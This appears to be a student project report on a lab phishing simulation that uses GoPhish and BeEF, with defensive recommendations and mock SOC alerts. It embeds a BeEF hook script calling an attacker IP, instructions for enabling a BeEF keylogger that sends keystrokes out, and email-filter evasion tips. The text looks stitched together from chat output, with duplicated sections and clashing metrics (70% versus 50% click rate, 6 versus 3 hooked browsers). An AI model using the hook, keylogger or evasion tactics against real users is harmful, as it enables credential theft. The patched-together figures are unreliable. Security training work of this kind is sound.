# Final Project Report: Human Weakness Exploitation via BeEF & GoPhish  
# **Theme:** Simulating Phishing and Post-Click Exploitation  

---

## 📌 Executive Summary  
This project simulates a phishing campaign paired with post-click browser exploitation to demonstrate how attackers exploit human vulnerabilities. Using **GoPhish** for phishing email delivery and **BeEF (Browser Exploitation Framework)** for post-interaction exploitation, we highlight common attack vectors and defenses. The simulation was conducted in a controlled lab environment with explicit consent and strict ethical boundaries.  

**Key Takeaways:**  
- Phishing remains a critical threat due to social engineering tactics.  
- Post-click exploitation (e.g., browser hijacking) can escalate attacks even with minimal initial access.  
- Awareness and technical safeguards are essential for mitigation.

## 🛠️ Attack Simulation Details  

### Lab Environment Setup  
- **Tools Used:**  
  - Kali Linux VM (Attacker Machine)  
  - Metasploitable VM (Sandboxed Target)  
  - **GoPhish** (Phishing Campaign Setup)  
  - **BeEF** (Browser Exploitation: `/usr/share/beef-xss`)  
- **Network Configuration:**  
  - All VMs isolated in a NAT network to prevent external exposure.  

### GoPhish Campaign Workflow  
1. **Phishing Email Design:**  
   - **Subject:** "Urgent: Required Security Update for Your Account"  
   - **Content:** Redirected users to a fake "Document Portal" with a call-to-action button.  
   - **Landing Page:** Embedded BeEF hook script:  
     ```html  
     <script src="http://192.168.0.4:3000/hook.js"></script>  
     ```  
2. **SMTP Configuration:**  
   - Used a mock SMTP server (MailHog) to avoid spamming real addresses.  
3. **Target List:**  
   - 10 lab participants with prior consent.  

### BeEF Exploitation Actions  
- **Hooked Browser Actions Demonstrated:**  
  - `alert("Your session is compromised!")` (Psychological impact demo).  
  - Browser fingerprinting (collecting OS, browser version, plugins).  
  - Fake login prompt to harvest credentials (simulated; no data stored).  
  - **Custom Payload:** Injected a mock "critical system update" popup to test user compliance.

## 📊 Metrics Collected  
| Metric                | Value         |  
|-----------------------|---------------|  
| Emails Sent           | 10            |  
| Emails Opened         | 9 (90%)       |  
| Links Clicked         | 7 (70%)       |  
| BeEF Hooked Sessions  | 6 (85% of clicks)|  
| Avg. Time-to-Click    | 22 minutes    |  

---

## 🔒 Ethical Boundaries Maintained  
- **No Real Users Targeted:** All recipients were lab participants with explicit consent.  
- **No Malware/Persistence:** BeEF commands were non-destructive and reversible.  
- **Data Handling:** No credentials or personal data stored; all logs deleted post-simulation.  
- **Browser Restrictions:** Webcam prompts only tested on pre-authorized machines.

### Landing Page Code Snippet  
```html  
<body>  
  <h1>Your Document Portal</h1>

🎣 BeEF Post-Click Actions
Demo Commands Executed:

Basic Exploits:

javascript
Copy
beef.execute(function() { alert("Security Alert!"); });  
Fingerprinting Results:
BeEF Dashboard

Custom Payload:

Simulated a fake Adobe Flash update prompt to test user behavior.

🛡️ Defense Recommendations
Technical Safeguards
Email Filtering: Deploy DMARC/DKIM to detect spoofed emails.

Browser Hardening: Block unauthorized scripts with extensions like uBlock Origin.

Network Monitoring: Flag traffic to known BeEF endpoints (e.g., :3000/hook.js).

User Training Tips
Red Flags: Urgent language, mismatched URLs, unsolicited attachments.

Verification Steps: Hover over links, confirm via trusted channels.

🚨 Mock SOC Alert Example
plaintext
Copy
[High Severity] Phishing Campaign Detected  
- Indicators of Compromise (IoCs):  
  - Sender: security-update@fakecorp[.]com  
  - URL: http://192.168.1.105:8080/fake-portal  
  - BeEF Server: 192.168.1.105:3000  
- Recommended Actions:  
  1. Block IoCs at firewall/proxy.  
  2. Reset credentials for users who submitted fake login data.  
  3. Launch user awareness training.

Phishing Defense Guide (CISA)

Disclaimer: This project was conducted ethically for educational purposes. No real systems or users were harmed.

Copy

This report provides a comprehensive overview of the attack simulation, technical execution, and defensive strategies. It is formatted for GitHub readability with clear sections, tables, and placeholder images (replace with actual screenshots in practice).



Step 5: Awareness & Defense Material
Red Flags:

Urgent language in emails.

Mismatched URLs (e.g., bit.ly/acme-reset vs. acme.com).

Defenses:

Technical: Enable SPF/DKIM/DMARC, block JavaScript in emails.

Non-Technical: Train users to hover links and report suspicious emails.

Step 6: Final Report
Executive Summary:

Simulated phishing campaign achieved 50% click rate; BeEF demonstrated post-click browser control.

Ethical Boundaries:

No real users targeted; all actions confined to lab VMs.

Mock SOC Alert:

Copy
[ALERT] Phishing Campaign Detected (ID: PH-2023-001)  
Indicators:  
- Sender: security@acme-support[.]net  
- URL: http://192.168.1.100:8080/reset  
Impact: 3 browsers hooked via BeEF.  
Action: Block sender IP, scan for compromised accounts.  
Custom BeEF Payload
Objective: Log keystrokes on the phishing page.

Edit /usr/share/beef-xss/modules/keylogger/module.js to include:

javascript
Copy
beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Keys logged: ' + keys);  
Reload BeEF and activate the keylogger module.

Bypassing Email Filters
Tactic: Use a URL shortener (e.g., bit.ly) and HTTPS on the phishing page (simulated via Let’s Encrypt on Kali).

Ethics Compliance
All actions were performed on lab VMs with no internet exposure.

Test users were notified post-simulation.
